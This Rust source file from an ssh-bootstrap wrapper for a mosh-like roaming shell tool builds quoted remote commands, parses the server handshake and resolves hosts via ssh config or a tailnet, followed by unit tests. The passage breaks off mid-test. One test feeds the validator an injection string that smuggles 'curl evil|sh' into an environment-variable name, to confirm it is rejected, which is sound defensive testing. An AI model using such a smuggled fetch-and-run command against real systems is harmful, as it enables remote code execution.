//! ssh bootstrap wrapper (mosh.pl port, simplified): run `posh server new`
//! on the remote host over ssh, parse the POSH IP / POSH CONNECT lines,
//! then run the UDP client locally with the key in the environment.

use std::io::{BufRead, BufReader};
use std::net::{IpAddr, ToSocketAddrs};
use std::process::{Command, Stdio};

use crate::remote::datagram::Family;
use crate::util::{Error, Result};

#[derive(Clone)]
pub struct SshOptions {
    pub family: Family,
    /// Server-side UDP port range, already validated ("P" or "P1:P2").
    pub port_range: Option<String>,
    /// SSH agent forwarding (FDR 0004): the resolved local agent socket the
    /// client proxy dials, or `None` when forwarding is off. `Some` is the
    /// single source of truth — `remote_command` appends `-A` to
    /// `posh-server new` exactly when this is set (C4: the bootstrap carries
    /// the outcome; the path itself stays client-side, never on the wire).
    pub agent_source: Option<std::path::PathBuf>,
    /// Real OpenSSH `-a`/`-A` to pass through to the bootstrap `ssh` process
    /// itself (FDR 0004 §Limitations: "`posh ssh` stays a thin ssh wrapper").
    /// `Some(true)` = `-A`, `Some(false)` = `-a`, `None` = say nothing, let
    /// ssh use its own default/config. Orthogonal to `agent_source`, which is
    /// posh's own transport-level forwarding to the roaming session.
    pub real_ssh_agent_forward: Option<bool>,
    /// RFC 0011 §6 — selects the channel-envelope protocol on the remote
    /// invocation; default off until the mux endpoint exists.
    pub channels: bool,
    /// Bound on the bootstrap ssh's TCP connect (`-o ConnectTimeout=<n>`).
    /// `None` says nothing, leaving ssh's own default/config — the normal
    /// session path, whose argv stays byte-identical to before this field.
    /// The mux daemon sets it so a hung destination cannot wedge the SHARED
    /// per-destination endpoint for every invocation behind it (a pre-mux
    /// hang cost only its own invocation).
    pub connect_timeout_secs: Option<u32>,
    /// posh#161: the per-destination mux endpoint (FDR 0014 M1) owns
    /// forwarding for this invocation, so `agent_source` is `None` (no `-A`
    /// rides to posh-server) — yet the session must still be born with
    /// `SSH_AUTH_SOCK=<base>/agent/sock`, the stable path that endpoint
    /// claims (valid across endpoint respawns and wire reconnects). Two
    /// consequences, both applied HERE so callers state only the fact:
    /// `remote_command` asks the remote to export that path (the
    /// `POSH_AGENT_EXPORT=1` env prefix — an older server ignores it, so no
    /// bootstrap failure across mixed versions; a current one honors it in
    /// `server::run` / the relay without binding an endpoint), and
    /// `ssh_args` runs the bootstrap ssh with `-a` unless
    /// `real_ssh_agent_forward` is explicit. The `-a` matters: with neither
    /// flag the workstation's ssh-config `ForwardAgent` applies and sshd
    /// stands up a forwarded-agent socket in the server's environment — a
    /// connection-bound competitor (it dies with the bootstrap's TCP
    /// connection, the very dependency posh removes) that a mux-mode session
    /// inherited and the host's login-shell rendezvous then latched onto
    /// (the posh#161 outage shape; FDR 0014 "Sessions reach the endpoint").
    pub agent_export: bool,
}

/// The env name carrying [`SshOptions::agent_export`] on the bootstrap remote
/// command (posh#161). An env prefix rather than a server flag so a remote
/// predating it stays bootstrappable (`cmd_server` rejects unknown flags).
pub const AGENT_EXPORT_ENV: &str = "POSH_AGENT_EXPORT";

/// Server side of [`AGENT_EXPORT_ENV`]: did the bootstrapping client ask
/// for the stable agent path to be exported into the session shell?
pub fn agent_export_requested() -> bool {
    env_selected(AGENT_EXPORT_ENV)
}

/// Truthy opt-in env read ("1"/"true"/"on"/"yes", case-insensitive; unset or
/// anything else = off) — the shape every opt-IN gate shares
/// ([`channels_selected`], [`agent_export_requested`]); default-ON gates use
/// `util::parse_default_on_gate` instead.
pub(crate) fn env_selected(name: &str) -> bool {
    std::env::var(name).map(|v| env_value_on(&v)).unwrap_or(false)
}

/// The server's handshake acknowledgement of [`AGENT_EXPORT_ENV`] (posh#161):
/// printed before `POSH CONNECT` by a `cmd_server` that honored the prefix.
/// Its ABSENCE under an export request means the remote predates the export
/// — and since the client ran the bootstrap ssh with `-a` on the strength of
/// that request, the session was born with no forwarded agent at all: the
/// one mixed-version shape this change makes WORSE than before, so it is
/// surfaced loudly ([`export_unacked_warning`]) instead of silently.
pub const AGENT_EXPORT_ACK_LINE: &str = "POSH AGENT_EXPORT";

/// The warning for an export request the remote did not acknowledge; `None`
/// when nothing was requested or the remote answered.
pub fn export_unacked_warning(requested: bool, acked: bool) -> Option<&'static str> {
    (requested && !acked).then_some(
        "posh: remote posh-server predates the stable agent-path export \
         (POSH_AGENT_EXPORT): this session has no forwarded agent until the \
         remote is upgraded — POSH_MUX=0 restores per-connection forwarding meanwhile",
    )
}

/// The bootstrap's failure when ssh ended without `POSH CONNECT`: the PATH
/// hint (the one posh-side cause) plus what ssh itself said, when its
/// stderr was captured — the last few non-empty lines, so an auth,
/// resolution, or host-key failure names itself in the mux log.
fn startup_failure(ssh_stderr: &str) -> Error {
    let mut msg = String::from(
        "did not find posh server startup message \
         (is posh-server on the server's non-interactive PATH?)",
    );
    let tail: Vec<&str> = ssh_stderr
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    if !tail.is_empty() {
        let keep = tail.len().saturating_sub(3);
        msg.push_str("; ssh: ");
        msg.push_str(&tail[keep..].join(" | "));
    }
    Error::Msg(msg)
}

/// What the wrapped server reported on stdout.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct ServerReport {
    pub ip: Option<String>,
    pub port: Option<u16>,
    pub key: Option<String>,
    /// The remote acknowledged the agent-path export request
    /// ([`AGENT_EXPORT_ACK_LINE`]).
    pub agent_export: bool,
}

impl ServerReport {
    /// Feeds one line of server output; returns false for lines that are
    /// not part of the protocol (motd etc., to be passed through), true
    /// once the CONNECT line arrived (parsing is finished).
    pub fn feed(&mut self, line: &str) -> Result<bool> {
        if line.trim_end() == AGENT_EXPORT_ACK_LINE {
            self.agent_export = true;
            return Ok(false);
        }
        if let Some(rest) = line.strip_prefix("POSH IP ") {
            let ip = rest.trim();
            if ip.is_empty() || ip.contains(char::is_whitespace) {
                return Err(Error::Msg(format!("bad POSH IP string: {line}")));
            }
            self.ip = Some(ip.to_string());
            return Ok(false);
        }
        if let Some(rest) = line.strip_prefix("POSH CONNECT ") {
            let (port, key) = parse_connect(rest)
                .ok_or_else(|| Error::Msg(format!("bad POSH CONNECT string: {line}")))?;
            self.port = Some(port);
            self.key = Some(key);
            return Ok(true);
        }
        Ok(false)
    }
}

/// Builds the remote command: locale variables forwarded as POSIX-sh
/// environment prefixes (LANG/LC_*, so the server sees the client's charset),
/// then `posh-server new [-A] [-4|-6] [-p R]`, then the caller-supplied server
/// `tail` appended verbatim — mosh (`mosh-server new`) parity; the package
/// installs posh-server as an alias of posh.
///
/// The caller OWNS the tail shape (RFC 0008 §3), so one function serves every
/// bootstrap: legacy `-- posh [-g G] attach SESSION [cmd...]`, single-model
/// `relay [-g G] SESSION [-- cmd...]`, or the bare-host `[-- cmd...]`. Each tail
/// token is shell-quoted for a lossless argv (a session name or command word
/// with spaces survives the remote shell) EXCEPT a bare `--`, which is emitted
/// unquoted so the legacy wire string stays byte-identical to the pre-relay
/// bootstrap. (`--` means the same argument quoted or not, so this is cosmetic
/// for the relay tail and load-bearing only for legacy byte-identity.)
/// The remote server executable in the bootstrap command: the packaged
/// `posh-server` from the remote's non-interactive PATH by default, or — when
/// `POSH_SERVER_CMD` names one — that binary, shell-quoted (#119). The
/// override is the one operator-supplied string in the bootstrap; quoting it
/// like every other interpolation makes a path with spaces work and renders
/// shell metacharacters inert on the remote. It is a single executable path,
/// not a command line. The default stays unquoted so the baseline wire string
/// remains byte-identical to the pre-override bootstrap.
fn server_command_head(override_cmd: Option<&str>) -> String {
    match override_cmd.filter(|s| !s.is_empty()) {
        Some(bin) => shell_quote(bin),
        None => "posh-server".to_string(),
    }
}

pub fn remote_command(
    opts: &SshOptions,
    tail: &[String],
    locale_vars: &[(String, String)],
) -> String {
    let mut cmd = String::new();
    for (name, value) in locale_vars {
        cmd.push_str(name);
        cmd.push('=');
        cmd.push_str(&shell_quote(value));
        cmd.push(' ');
    }
    // posh#161: the stable-path export request rides as an env prefix like
    // the locale vars (forward-compatible: an old server ignores it), AFTER
    // them so the locale prefix string stays byte-identical when unset.
    if opts.agent_export {
        cmd.push_str(AGENT_EXPORT_ENV);
        cmd.push_str("=1 ");
    }
    cmd.push_str(&server_command_head(
        std::env::var("POSH_SERVER_CMD").ok().as_deref(),
    ));
    cmd.push_str(" new");
    // C4: the bootstrap carries only the outcome (forward or not), never the
    // source path — that lives client-side. A bare `-A` to posh-server.
    if opts.agent_source.is_some() {
        cmd.push_str(" -A");
    }
    // RFC 0011 §6: the envelope is selected out of band, by explicit argument
    // on the bootstrap invocation; a server invoked without it speaks baseline.
    if opts.channels {
        cmd.push_str(" --channels");
    }
    match opts.family {
        Family::Inet => cmd.push_str(" -4"),
        Family::Inet6 => cmd.push_str(" -6"),
        Family::Auto => {}
    }
    if let Some(range) = &opts.port_range {
        cmd.push_str(" -p ");
        cmd.push_str(range);
    }
    for arg in tail {
        cmd.push(' ');
        if arg == "--" {
            cmd.push_str("--");
        } else {
            cmd.push_str(&shell_quote(arg));
        }
    }
    cmd
}

/// RFC 0011 §6 local selection: the client opts into the channel-envelope
/// protocol via `POSH_CHANNELS` ("1"/"true"/"on"/"yes", case-insensitive);
/// absent or anything else means baseline. Default OFF until the mux endpoint
/// exists.
pub fn channels_selected() -> bool {
    env_selected("POSH_CHANNELS")
}

/// The truthy-env predicate ("1"/"true"/"on"/"yes", case-insensitive) behind
/// [`channels_selected`] (`POSH_CHANNELS`) — the opt-IN shape; default-on
/// gates use `util::parse_default_on_gate` instead. Factored so it can be
/// unit-tested without touching the (global, test-racy) process environment.
pub(crate) fn env_value_on(v: &str) -> bool {
    matches!(v.to_ascii_lowercase().as_str(), "1" | "true" | "on" | "yes")
}

/// True for an env-var name safe to splice into a POSIX-sh assignment: only
/// `[A-Za-z_][A-Za-z0-9_]*`. Anything else (the kernel permits arbitrary
/// bytes except `=`/NUL in names) would break — or inject into — the remote
/// command string, since the name is emitted unquoted. github #6.
fn is_shell_safe_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Environment the remote `posh-server` should see: LANG + every LC_*
/// (charset, mosh parity); TERM and COLORTERM (posh#51 — so the session shell
/// isn't left with an empty TERM, which strands color-by-$TERM tools like git
/// and Charmbracelet TUIs); and POSH_DEBUG_LOG, so a single locally-set perf-log
/// path lights up both ends (the server logs to that path on the *remote* host,
/// failing closed if it isn't writable there); and POSH_ESCAPE_CMD, so the
/// escape-to-shell command (FDR 0008) is set once on the client and runs on the
/// *remote* server. TERM rides as a *candidate*: the
/// server resolves it against its own terminfo DB (terminfo::resolve_term).
/// Restricted to names safe to emit as shell assignments.
///
/// Contract: `terminfo::session_env` (server side) reads TERM and COLORTERM
/// back out of `posh-server`'s process env, which is *only* populated because
/// they're in this filter. Dropping COLORTERM here silently regresses remote
/// truecolor (TERM degrades gracefully via resolve_term; COLORTERM has no
/// fallback). Keep the two sides in sync. POSH_KEY is deliberately excluded —
/// the session key never travels in the cleartext remote command string.
fn forwarded_env_vars() -> Vec<(String, String)> {
    std::env::vars()
        .filter(|(k, _)| {
            (k == "LANG"
                || k.starts_with("LC_")
                || k == "TERM"
                || k == "COLORTERM"
                || k == "POSH_DEBUG_LOG"
                || k == "POSH_ESCAPE_CMD")
                && is_shell_safe_name(k)
        })
        .collect()
}

/// Where an ssh spawn for a typed `[user@]host` actually dials, and under
/// which known_hosts name (posh#179/#182). The ONE resolver behind every ssh
/// posh runs — the session bootstrap, the detached spawn, and the remote
/// `posh list` probe — so a tailnet peer the system resolver cannot reach
/// works on every path, and the typed name stays the identity everywhere
/// else (the mux daemon's key, messages, the completion sources).
///
/// The decision is surprise-free: `ssh -G` applies the user's ssh config
/// (a `Host` alias with a `HostName`, a proxy jump) exactly as ssh itself
/// would, and the name is dialed AS TYPED whenever that effective hostname
/// resolves or the connection is proxied. Only an unresolvable, unproxied
/// name is substituted with the peer's tailnet FQDN, or — on a tailnet whose
/// MagicDNS names carry no domain (headscale without a base domain) — its
/// tailnet IP. An IP substitution dials with `HostKeyAlias=<typed>`, so ssh
/// trusts the peer under the name you typed: one known_hosts entry that
/// survives a tailnet address change and never asks you to re-accept a key
/// per IP. A FQDN substitution keeps ssh's own naming (the FQDN is stable
/// and may already be trusted under itself).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshDest {
    pub user: Option<String>,
    pub typed_host: String,
    pub dial_host: String,
    pub host_key_alias: Option<String>,
}

impl SshDest {
    /// Resolve a typed `[user@]host`: ssh config first, then the system
    /// resolver, then the tailnet fallback. Never fails — an unknown name is
    /// dialed as typed and ssh reports its own resolution error.
    pub fn resolve(dest: &str) -> SshDest {
        let (user, host) = split_user(dest);
        let view = ssh_config_view(host);
        let (dial_host, host_key_alias) = decide_dial(
            host,
            &view,
            system_resolves,
            crate::tailnet::ssh_fallback,
        );
        SshDest {
            user: user.map(str::to_string),
            typed_host: host.to_string(),
            dial_host,
            host_key_alias,
        }
    }

    /// The typed destination, dialed as typed (no config or resolver
    /// consulted) — the argv-shape tests' fixture.
    #[cfg(test)]
    pub fn verbatim(dest: &str) -> SshDest {
        let (user, host) = split_user(dest);
        SshDest {
            user: user.map(str::to_string),
            typed_host: host.to_string(),
            dial_host: host.to_string(),
            host_key_alias: None,
        }
    }

    /// The `[user@]host` argument for ssh.
    pub fn target(&self) -> String {
        match &self.user {
            Some(u) => format!("{u}@{}", self.dial_host),
            None => self.dial_host.clone(),
        }
    }

    /// The ssh options the dial decision needs: the host-key alias for a
    /// substituted IP, nothing otherwise (argv byte-identical to before).
    pub fn ssh_args(&self) -> Vec<String> {
        match &self.host_key_alias {
            Some(alias) => vec!["-o".to_string(), format!("HostKeyAlias={alias}")],
            None => Vec::new(),
        }
    }

    pub fn substituted(&self) -> bool {
        self.dial_host != self.typed_host
    }

    /// The typed destination for a message, with the substitution shown so a
    /// failure names both what was typed and what was dialed.
    pub fn describe(&self) -> String {
        let typed = match &self.user {
            Some(u) => format!("{u}@{}", self.typed_host),
            None => self.typed_host.clone(),
        };
        if self.substituted() {
            format!("{typed} (dialed {} via the tailnet)", self.dial_host)
        } else {
            typed
        }
    }

    /// The one-line stderr notice for a foreground substitution, so the
    /// dialed address is never a surprise.
    pub fn notice(&self) -> Option<String> {
        self.substituted().then(|| {
            format!(
                "posh: {} did not resolve; dialing {} (tailnet)",
                self.typed_host, self.dial_host
            )
        })
    }
}

/// `[user@]host` split at the LAST `@` (ssh's rule). An empty user counts as
/// absent.
fn split_user(dest: &str) -> (Option<&str>, &str) {
    match dest.rsplit_once('@') {
        Some(("", host)) => (None, host),
        Some((user, host)) => (Some(user), host),
        None => (None, dest),
    }
}

/// What ssh would do with a host name, per the user's config: the effective
/// `HostName` (an alias's target, else the name itself) and whether the
/// connection is proxied (`ProxyJump`/`ProxyCommand`), in which case local
/// resolution is irrelevant and ssh must be trusted as-is.
#[derive(Debug, Clone, PartialEq, Eq)]
struct SshConfigView {
    hostname: String,
    proxied: bool,
}

/// `ssh -G <host>`: the effective configuration, no connection made. Any
/// failure (no ssh on PATH, an unparseable dump) degrades to "the name is its
/// own hostname, unproxied" — the decision then rests on the resolver alone.
fn ssh_config_view(host: &str) -> SshConfigView {
    let dump = Command::new("ssh")
        .arg("-G")
        .arg("--")
        .arg(host)
        .stdin(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .ok()
        .filter(|out| out.status.success())
        .and_then(|out| String::from_utf8(out.stdout).ok());
    match dump {
        Some(text) => parse_ssh_config_dump(host, &text),
        None => SshConfigView {
            hostname: host.to_string(),
            proxied: false,
        },
    }
}

/// Parse the `key value` lines of an `ssh -G` dump. A `none` proxy value is
/// ssh's spelling for unset.
fn parse_ssh_config_dump(host: &str, dump: &str) -> SshConfigView {
    let mut view = SshConfigView {
        hostname: host.to_string(),
        proxied: false,
    };
    for line in dump.lines() {
        let Some((key, value)) = line.split_once(' ') else {
            continue;
        };
        let value = value.trim();
        match key.to_ascii_lowercase().as_str() {
            "hostname" if !value.is_empty() => view.hostname = value.to_string(),
            "proxyjump" | "proxycommand" if !value.is_empty() && value != "none" => {
                view.proxied = true;
            }
            _ => {}
        }
    }
    view
}

/// Whether the system resolver (getaddrinfo, which honors a working MagicDNS
/// or search domain) has an address for `host`.
fn system_resolves(host: &str) -> bool {
    (host, 22u16)
        .to_socket_addrs()
        .map(|mut addrs| addrs.next().is_some())
        .unwrap_or(false)
}

/// The pure dial decision behind [`SshDest::resolve`]: `(dial_host,
/// host_key_alias)`. Injected resolver and tailnet lookups keep it testable
/// without a network or a `tailscale` binary.
fn decide_dial(
    typed: &str,
    view: &SshConfigView,
    resolves: impl Fn(&str) -> bool,
    tailnet_fallback: impl Fn(&str) -> Option<String>,
) -> (String, Option<String>) {
    if view.proxied || resolves(&view.hostname) {
        return (typed.to_string(), None);
    }
    match tailnet_fallback(typed) {
        Some(sub) => {
            let alias = sub.parse::<IpAddr>().is_ok().then(|| typed.to_string());
            (sub, alias)
        }
        None => (typed.to_string(), None),
    }
}

/// Drives the ssh bootstrap for a `posh-server` invocation and parses its
/// `POSH IP`/`POSH CONNECT` report: returns `(host, port, key)` for the
/// caller to stand up its own UDP connection. Factored from [`run`] so the
/// mux daemon (M1 Task 3) can bootstrap the agent-only remote
/// (`posh-server agent`, via a `["agent", "--client-id", ..]` tail with
/// `channels: true`) without inheriting the foreground client that `run`
/// chains into. The key is returned, never exported — only `run`'s
/// foreground path uses the `POSH_KEY` env convention.
/// The ssh argv ahead of the target — address family, real agent-forward
/// pass-through, and the optional `-o ConnectTimeout=<n>` bound. The pure
/// seam behind [`bootstrap`]'s process spawn, so tests pin the exact flag
/// shape (present for the mux daemon's bounded bootstrap, absent — argv
/// byte-identical — for the normal session path) without spawning ssh.
/// `pub(crate)` so the mux module pins its own call shape against it.
pub(crate) fn ssh_args(opts: &SshOptions) -> Vec<String> {
    let mut args = Vec::new();
    match opts.family {
        Family::Inet => args.push("-4".to_string()),
        Family::Inet6 => args.push("-6".to_string()),
        Family::Auto => {}
    }
    // posh#161: an export request means posh's own path serves the session,
    // so the bootstrap ssh must not let sshd stand up a competing forwarded
    // socket (ssh-config `ForwardAgent` would) — `-a` unless the caller's
    // flag was explicit. The ONE place that rule lives.
    match (opts.real_ssh_agent_forward, opts.agent_export) {
        (Some(true), _) => args.push("-A".to_string()),
        (Some(false), _) | (None, true) => args.push("-a".to_string()),
        (None, false) => {}
    }
    if let Some(secs) = opts.connect_timeout_secs {
        args.push("-o".to_string());
        args.push(format!("ConnectTimeout={secs}"));
    }
    args
}

pub fn bootstrap(
    target: &str,
    remote_cmd: &[String],
    opts: &SshOptions,
) -> Result<(String, u16, String)> {
    let server_cmd = remote_command(opts, remote_cmd, &forwarded_env_vars());

    // posh#182: resolved per attempt (the mux daemon re-runs this on every
    // reconnect, so a tailnet address change is picked up, not cached).
    let dest = SshDest::resolve(target);
    if let Some(notice) = dest.notice() {
        eprintln!("{notice}");
    }
    let mut ssh = Command::new("ssh");
    ssh.args(ssh_args(opts));
    ssh.args(dest.ssh_args());
    // ssh's stderr: on a tty it streams through (auth prompts, warnings);
    // with no tty (the mux daemon's bootstrap) it is captured so a failed
    // attempt can SAY why — the generic "no startup message" hid the real
    // ssh error (resolution, an agent prompt refused without a tty, a host
    // key) behind a PATH hint. Drained on a thread so a chatty ssh can never
    // fill the pipe while stdout is being read.
    let capture_stderr = !crate::util::is_tty(libc::STDERR_FILENO);
    let mut child = ssh
        .arg(dest.target())
        .arg("--")
        .arg(&server_cmd)
        .stdin(Stdio::inherit()) // keep the tty for auth prompts
        .stdout(Stdio::piped())
        .stderr(if capture_stderr { Stdio::piped() } else { Stdio::inherit() })
        .spawn()
        .map_err(|e| Error::Msg(format!("cannot exec ssh: {e}")))?;
    let stderr_drain = child.stderr.take().map(|mut err| {
        std::thread::spawn(move || {
            let mut bytes = Vec::new();
            let _ = std::io::Read::read_to_end(&mut err, &mut bytes);
            bytes
        })
    });

    let stdout = child.stdout.take().expect("piped stdout");
    let mut report = ServerReport::default();
    for line in BufReader::new(stdout).lines() {
        let line = line?;
        if report.feed(&line)? {
            break;
        }
        if !line.starts_with("POSH ") {
            // Pass through motd and friends.
            println!("{line}");
        }
    }
    let _ = child.wait();
    let ssh_stderr = stderr_drain
        .and_then(|h| h.join().ok())
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
        .unwrap_or_default();

    let (Some(port), Some(key)) = (report.port, report.key) else {
        return Err(startup_failure(&ssh_stderr));
    };
    if let Some(warning) = export_unacked_warning(opts.agent_export, report.agent_export) {
        eprintln!("{warning}");
    }

    // Prefer the address the server reported (third field of its
    // $SSH_CONNECTION: the IP we actually reached it on); fall back to
    // resolving the hostname we dialed, as mosh.pl does.
    let host = report.ip.unwrap_or(dest.dial_host);
    Ok((host, port, key))
}

pub fn run(target: &str, remote_cmd: &[String], opts: &SshOptions) -> Result<()> {
    let (host, port, key) = bootstrap(target, remote_cmd, opts)?;
    std::env::set_var("POSH_KEY", key);
    crate::remote::client::run(&host, port, opts.family, opts.agent_source.clone(), opts.channels)
}

/// #67: create-or-ensure a DETACHED session on the remote host and return,
/// without standing up the roaming transport. Unlike [`run`], this execs the
/// inner posh command directly over ssh (no `posh-server new`, no UDP
/// client): `inner` is `posh [-g GROUP] attach SESSION --detach [command...]`,
/// which double-forks a session daemon on the host and exits. A later
/// foreground `posh host:group/session` attaches to that same daemon session
/// through a fresh, disposable transport pair. Agent forwarding (FDR 0004)
/// rides that later foreground connection, not the spawn — so no `-A` here.
pub fn run_detached(target: &str, inner: &[String], opts: &SshOptions) -> Result<()> {
    let remote_cmd = detached_command(inner, &forwarded_env_vars());

    let dest = SshDest::resolve(target);
    if let Some(notice) = dest.notice() {
        eprintln!("{notice}");
    }
    let mut ssh = Command::new("ssh");
    match opts.family {
        Family::Inet => {
            ssh.arg("-4");
        }
        Family::Inet6 => {
            ssh.arg("-6");
        }
        Family::Auto => {}
    }
    ssh.args(dest.ssh_args());
    let status = ssh
        .arg(dest.target())
        .arg("--")
        .arg(&remote_cmd)
        .stdin(Stdio::inherit()) // keep the tty for auth prompts
        .stdout(Stdio::inherit()) // pass through `posh attach --detach`'s status line
        .stderr(Stdio::inherit())
        .status()
        .map_err(|e| Error::Msg(format!("cannot exec ssh: {e}")))?;
    if !status.success() {
        return Err(Error::Msg(format!(
            "remote detached spawn failed on {}",
            dest.describe()
        )));
    }
    Ok(())
}

/// Builds the remote command for a detached spawn (#67): locale/TERM env
/// prefixes (the same forwarding the foreground bootstrap applies), then the
/// inner `posh ... attach ... --detach ...` argv, each element shell-quoted so
/// a command with spaces survives the remote shell intact.
fn detached_command(inner: &[String], env_vars: &[(String, String)]) -> String {
    let mut cmd = String::new();
    for (name, value) in env_vars {
        cmd.push_str(name);
        cmd.push('=');
        cmd.push_str(&shell_quote(value));
        cmd.push(' ');
    }
    for (i, arg) in inner.iter().enumerate() {
        if i > 0 {
            cmd.push(' ');
        }
        cmd.push_str(&shell_quote(arg));
    }
    cmd
}

fn parse_connect(rest: &str) -> Option<(u16, String)> {
    let mut words = rest.split_whitespace();
    let port: u16 = words.next()?.parse().ok()?;
    let key = words.next()?;
    if key.len() != 22 || words.next().is_some() {
        return None;
    }
    Some((port, key.to_string()))
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn unproxied(hostname: &str) -> SshConfigView {
        SshConfigView {
            hostname: hostname.to_string(),
            proxied: false,
        }
    }

    #[test]
    fn ssh_config_dump_yields_effective_hostname_and_proxy_state() {
        // posh#182: `ssh -G` is how the user's config (aliases, proxies) is
        // honored before any tailnet substitution is considered.
        let dump = "user me\nhostname box.example.net\nproxycommand none\nport 22\n";
        assert_eq!(
            parse_ssh_config_dump("box", dump),
            unproxied("box.example.net")
        );
        let jumped = "hostname 10.0.0.5\nproxyjump bastion\n";
        assert!(parse_ssh_config_dump("inner", jumped).proxied);
        let via_cmd = "hostname inner\nproxycommand ssh -W %h:%p bastion\n";
        assert!(parse_ssh_config_dump("inner", via_cmd).proxied);
        // No hostname line (or garbage): the name is its own hostname.
        assert_eq!(parse_ssh_config_dump("box", "nonsense"), unproxied("box"));
    }

    #[test]
    fn dial_decision_is_as_typed_whenever_ssh_would_succeed() {
        // A resolvable effective hostname (a working MagicDNS name, or an
        // alias whose HostName resolves) dials as typed — an ssh-config alias
        // is never bypassed even when the tailnet knows the name too.
        let never = |_: &str| -> Option<String> { panic!("tailnet must not be consulted") };
        assert_eq!(
            decide_dial("flac", &unproxied("flac.example.net"), |_| true, never),
            ("flac".to_string(), None)
        );
        // A proxied connection is ssh's business regardless of local resolution.
        let proxied = SshConfigView {
            hostname: "inner".into(),
            proxied: true,
        };
        assert_eq!(
            decide_dial("inner", &proxied, |_| false, never),
            ("inner".to_string(), None)
        );
    }

    #[test]
    fn dial_decision_substitutes_the_tailnet_route_only_when_unresolvable() {
        // The headscale shape (posh#182 report): MagicDNS names carry no
        // domain, so the peer's only route is its tailnet IP — dialed under
        // a HostKeyAlias of the TYPED name, so the key is trusted once as
        // `flac`, not per address.
        assert_eq!(
            decide_dial(
                "flac",
                &unproxied("flac"),
                |_| false,
                |_| Some("100.96.0.8".to_string())
            ),
            ("100.96.0.8".to_string(), Some("flac".to_string()))
        );
        // A FQDN substitution keeps ssh's own naming (no alias).
        assert_eq!(
            decide_dial(
                "flac",
                &unproxied("flac"),
                |_| false,
                |_| Some("flac.tail1234.ts.net".to_string())
            ),
            ("flac.tail1234.ts.net".to_string(), None)
        );
        // Unknown to the tailnet too: dial as typed and let ssh say why.
        assert_eq!(
            decide_dial("ghost", &unproxied("ghost"), |_| false, |_| None),
            ("ghost".to_string(), None)
        );
    }

    #[test]
    fn ssh_dest_carries_the_user_and_renders_alias_target_and_describe() {
        let dest = SshDest {
            user: Some("me".into()),
            typed_host: "flac".into(),
            dial_host: "100.96.0.8".into(),
            host_key_alias: Some("flac".into()),
        };
        assert_eq!(dest.target(), "me@100.96.0.8");
        assert_eq!(dest.ssh_args(), ["-o", "HostKeyAlias=flac"].map(String::from));
        assert!(dest.substituted());
        assert_eq!(
            dest.describe(),
            "me@flac (dialed 100.96.0.8 via the tailnet)"
        );
        assert_eq!(
            dest.notice().as_deref(),
            Some("posh: flac did not resolve; dialing 100.96.0.8 (tailnet)")
        );
        // Verbatim: as typed, argv byte-identical to before the resolver.
        let plain = SshDest::verbatim("user@box");
        assert_eq!(plain.target(), "user@box");
        assert!(plain.ssh_args().is_empty());
        assert!(!plain.substituted());
        assert_eq!(plain.describe(), "user@box");
        assert_eq!(plain.notice(), None);
        assert_eq!(SshDest::verbatim("@box").user, None);
        assert_eq!(SshDest::verbatim("u@v@box").user.as_deref(), Some("u@v"));
    }

    #[test]
    fn parses_connect_line() {
        assert_eq!(
            parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA"),
            Some((60001, "AAAAAAAAAAAAAAAAAAAAAA".to_string()))
        );
        assert_eq!(parse_connect("60001 shortkey"), None);
        assert_eq!(parse_connect("notaport AAAAAAAAAAAAAAAAAAAAAA"), None);
        assert_eq!(parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA extra"), None);
    }

    #[test]
    fn agent_export_ack_rides_the_handshake_and_its_absence_warns() {
        // posh#161 mixed-version guard: a server that honored the export
        // prints the ack BEFORE POSH CONNECT; the client parses it as a
        // non-terminal protocol line (not passed through as motd). A server
        // that ignored the prefix prints nothing, and since the client ran
        // the bootstrap ssh with -a on the strength of the request, that is
        // the one case the change makes worse — it must warn, not be silent.
        let mut report = ServerReport::default();
        assert!(!report.feed(AGENT_EXPORT_ACK_LINE).unwrap(), "non-terminal");
        assert!(report.agent_export);
        assert!(report.feed("POSH CONNECT 60001 AAAAAAAAAAAAAAAAAAAAAA").unwrap());
        assert!(report.agent_export, "the ack survives the CONNECT line");

        let mut silent = ServerReport::default();
        assert!(silent.feed("POSH CONNECT 60001 AAAAAAAAAAAAAAAAAAAAAA").unwrap());
        assert!(!silent.agent_export);

        assert!(export_unacked_warning(true, false).is_some());
        assert!(export_unacked_warning(true, true).is_none());
        assert!(export_unacked_warning(false, false).is_none(), "nothing requested");
        // An old CLIENT meets the ack line harmlessly: it is a `POSH ` line,
        // so the bootstrap loop neither prints nor fails on it.
        assert!(AGENT_EXPORT_ACK_LINE.starts_with("POSH "));
    }

    #[test]
    fn shell_quote_escapes_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn only_well_formed_env_names_are_forwarded() {
        assert!(is_shell_safe_name("LANG"));
        assert!(is_shell_safe_name("LC_CTYPE"));
        assert!(is_shell_safe_name("_x9"));
        assert!(!is_shell_safe_name("")); // empty
        assert!(!is_shell_safe_name("9LC")); // leading digit
        assert!(!is_shell_safe_name("LC_X;curl evil|sh;")); // metacharacters
        assert!(!is_shell_safe_name("LC X")); // space
    }

    /// A failed bootstrap names ssh's own complaint (its last non-empty
    /// stderr lines) after the PATH hint; with nothing captured the hint
    /// stands alone.
    #[test]
    fn startup_failure_carries_the_ssh_stderr_tail() {
        let bare = startup_failure("").to_string();
        assert!(bare.starts_with("did not find posh server startup message"));
        assert!(!bare.contains("ssh:"));
        let noisy = startup_failure(
            "Warning: Permanently added 'box' (ED25519) to the list of known hosts.\n\n\
             sign_and_send_pubkey: signing failed for ED25519 \"cardno:1\" from agent: agent refused operation\n\
             me@box: Permission denied (publickey).\n",
        )
        .to_string();
        assert!(noisy.contains("ssh: Warning: Permanently added"), "{noisy}");
        assert!(noisy.contains("agent refused operation | me@box: Permission denied"), "{noisy}");
